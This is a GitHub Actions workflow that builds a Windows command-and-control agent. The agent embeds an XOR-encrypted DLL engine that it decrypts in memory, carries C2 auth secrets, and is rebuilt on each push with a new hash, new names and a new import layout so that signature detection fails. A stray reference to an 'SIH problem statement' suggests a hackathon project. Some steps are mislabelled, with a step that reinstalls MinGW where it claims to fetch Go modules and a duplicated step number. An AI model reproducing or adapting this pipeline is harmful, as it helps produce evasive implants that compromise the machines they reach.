# .github/workflows/build.yml
#
# Proteus — Polymorphic CI/CD Pipeline
# ======================================
# Triggered on every push to main.
# Each run:
#   1. Builds the C execution engine as a Windows DLL (MinGW cross-compile)
#   2. Encrypts the DLL with the C2_AUTH_XOR secret (XOR-32)
#   3. Runs ci_build.py → cross-compiles agent/main.go to a Windows PE
#   4. Uploads the binary as a GitHub Actions artifact
#   5. Prints the SHA-256 in the step summary
#
# No two runs produce the same binary — that is the polymorphic guarantee.
#
# Required GitHub Secrets (Settings → Secrets and variables → Actions):
#   C2_AUTH       — the Cloudflare Worker's C2_AUTH value (32+ chars)
#   C2_AUTH_XOR   — 64 hex chars (32 bytes) — the DLL XOR key
#                    Must match the XOR key the agent is built with.

name: Polymorphic CI Build

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read              # least-privilege: read repo, nothing else

jobs:
  polymorphic-build:
    name: "🔄 Polymorphic agent build"
    runs-on: ubuntu-latest    # Linux runner — cross-compiles to Windows via GOOS

    steps:
      # ── 1. Checkout ─────────────────────────────────────────────────────────
      - name: Checkout repository
        uses: actions/checkout@v4

      # ── 2. Go toolchain ─────────────────────────────────────────────────────
      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: "1.25"
          # Cache keyed to go.sum — speeds up dependency fetches on repeat runs
          cache-dependency-path: agent/go.sum

      # ── 3. Python (for the polymorphic engine) ─────────────────────────────
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      # ── 4. MinGW-w64 + CMake (for the C execution engine) ──────────────────
      - name: Install MinGW-w64 and CMake
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq mingw-w64 cmake

      # ── 5. Install polymorphic engine dependencies ─────────────────────────
      - name: Install polymorphic engine dependencies
        run: |
          pip install --quiet \
            pefile==2023.2.7       \
            cryptography==41.0.7   \
            pycryptodome==3.19.0   \
            capstone==5.0.1        \
            colorama==0.4.6        \
            tqdm==4.66.1           \
            pyelftools==0.30       \
            macholib==1.16.3       \
            astor==0.8.1           \
            lief

      # ── 6. Pre-fetch Go module cache ───────────────────────────────────────
      - name: Pre-fetch Go dependencies (GOOS=windows)
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq mingw-w64 cmake

      # ── 7. Build the C execution engine as a Windows DLL ───────────────────
      #
      # Cross-compiles libjockey.dll with MinGW-w64. The DLL is the engine
      # that the agent embeds encrypted and loads at runtime.
      - name: Build execution engine (libjockey.dll)
        run: |
          mkdir -p execution_engine/build
          cd execution_engine/build
          cmake .. \
            -DCMAKE_BUILD_TYPE=Release \
            -DBUILD_SHARED=ON \
            -DHARDEN=ON \
            -DCMAKE_SYSTEM_NAME=Windows \
            -DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc \
            -DCMAKE_RC_COMPILER=x86_64-w64-mingw32-windres
          cmake --build . --parallel

          echo "[+] Engine built:"
          ls -la libjockey.dll

      # ── 8. Encrypt the DLL with the C2_AUTH_XOR secret ─────────────────────
      #
      # The agent embeds libjockey.enc and XOR-decrypts it in memory at runtime.
      # The XOR key must be IDENTICAL between this step and the -ldflags below.
      # Same key is passed to both via the C2_AUTH_XOR secret.
      - name: Encrypt engine DLL
        env:
          C2_AUTH_XOR: ${{ secrets.C2_AUTH_XOR }}
        run: |
          if [ -z "$C2_AUTH_XOR" ]; then
            echo "[-] C2_AUTH_XOR secret is not set" >&2
            exit 1
          fi
          if ! [[ "$C2_AUTH_XOR" =~ ^[0-9a-fA-F]{64}$ ]]; then
            echo "[-] C2_AUTH_XOR must be exactly 64 hexadecimal characters" >&2
            exit 1
          fi

          python - <<'PY'
          import binascii
          import os
          from pathlib import Path

          key = binascii.unhexlify(os.environ["C2_AUTH_XOR"])
          source = Path("execution_engine/build/libjockey.dll")
          destination = Path("agent/libjockey.enc")
          data = source.read_bytes()
          destination.write_bytes(
              bytes(value ^ key[index % len(key)] for index, value in enumerate(data))
          )
          print(f"[+] Encrypted {len(data)} bytes -> {destination}")
          PY

      # ── 9. Run the polymorphic build ───────────────────────────────────────
      #
      # ci_build.py:
      #   • reads C2_AUTH_TOKEN + C2_AUTH_XOR from env
      #   • passes them to the Go linker via -ldflags
      #   • cross-compiles with GOOS=windows GOARCH=amd64 -trimpath -s -w
      #   • writes to build/agent_<random-id>.exe
      - name: Run polymorphic build
        env:
          C2_AUTH_TOKEN: ${{ secrets.C2_AUTH }}
          C2_AUTH_XOR: ${{ secrets.C2_AUTH_XOR }}
        run: |
          python ci_build.py \
            --output-dir build/ \
            --os windows        \
            --arch amd64

      # ── 10. Compute hash & export to environment ───────────────────────────
      - name: Compute binary hash
        id: hash
        run: |
          BINARY=$(ls build/agent_*.exe | head -1)
          BINARY_NAME=$(basename "$BINARY")
          HASH=$(sha256sum "$BINARY" | awk '{print $1}')
          SIZE=$(stat -c '%s' "$BINARY")

          # Export for upload step name + summary
          echo "binary_name=$BINARY_NAME" >> "$GITHUB_OUTPUT"
          echo "sha256=$HASH"             >> "$GITHUB_OUTPUT"
          echo "size_bytes=$SIZE"         >> "$GITHUB_OUTPUT"

          echo ""
          echo "╔══════════════════════════════════════════════════════════════╗"
          echo "║  Polymorphic Build Result                                    ║"
          echo "╠══════════════════════════════════════════════════════════════╣"
          printf "║  Binary  : %-50s║\n" "$BINARY_NAME"
          printf "║  SHA-256 : %-50s║\n" "${HASH:0:50}"
          printf "║  (cont.) : %-50s║\n" "${HASH:50}"
          printf "║  Size    : %-50s║\n" "$SIZE bytes"
          echo "╚══════════════════════════════════════════════════════════════╝"
          echo ""
          echo "Every CI run produces a DIFFERENT hash — polymorphic guarantee ✓"

      # ── 11. Upload artifact ────────────────────────────────────────────────
      - name: Upload polymorphic binary
        uses: actions/upload-artifact@v4
        with:
          name: "polymorphic-agent-${{ github.sha }}"
          path: build/*.exe
          retention-days: 30
          if-no-files-found: error

      # ── 12. GitHub step summary ────────────────────────────────────────────
      - name: Write build summary
        run: |
          {
            echo "## 🔄 Polymorphic Build — \`${{ github.sha }}\`"
            echo ""
            echo "| Field | Value |"
            echo "|:------|:------|"
            echo "| **Binary** | \`${{ steps.hash.outputs.binary_name }}\` |"
            echo "| **SHA-256** | \`${{ steps.hash.outputs.sha256 }}\` |"
            echo "| **Size** | ${{ steps.hash.outputs.size_bytes }} bytes |"
            echo "| **Commit** | \`${{ github.sha }}\` |"
            echo "| **Branch** | \`${{ github.ref_name }}\` |"
            echo "| **Triggered by** | ${{ github.event_name }} |"
            echo ""
            echo "> **Polymorphic guarantee:** every push to \`main\` produces a binary"
            echo "> with a **different hash, different variable names, and different"
            echo "> import-table layout** — directly satisfying the SIH problem statement."
          } >> "$GITHUB_STEP_SUMMARY"

      # ── 10. Run Python test suites ─────────────────────────────────────────
      - name: Run Python tests
        run: |
          python -m pytest compiler/tests runtime/tests manager/tests -q
